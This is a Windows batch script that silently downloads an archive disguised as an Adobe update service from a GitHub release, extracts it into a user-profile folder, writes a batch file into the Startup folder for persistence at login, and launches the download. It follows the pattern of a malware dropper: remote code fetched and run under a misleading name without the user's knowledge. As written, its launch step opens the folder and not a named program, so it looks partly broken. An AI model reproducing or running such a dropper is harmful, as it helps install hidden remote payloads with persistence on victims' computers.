@echo off
set "zipUrl=https://github.com/FoliowiecGit/Eduware/releases/download/eduware/AdobeUpdateService32.zip"
set "downloadPath=%USERPROFILE%\\URN"
if exist "%downloadPath%" exit
if not exist "%downloadPath%" mkdir "%downloadPath%"
curl -L -o "%downloadPath%\sys.rar" "%zipUrl%"
C:
cd %downloadPath%
tar -xf sys.rar
set "startup=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "batchScriptPath=%startup%\sys.bat"
(
echo @echo off
echo start "" "%downloadPath%"
) > "%batchScriptPath%"
start "" "%downloadPath%"
